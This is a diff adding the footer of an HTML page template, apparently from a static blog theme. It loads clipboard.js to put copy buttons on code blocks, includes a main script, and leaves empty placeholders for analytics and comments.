+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
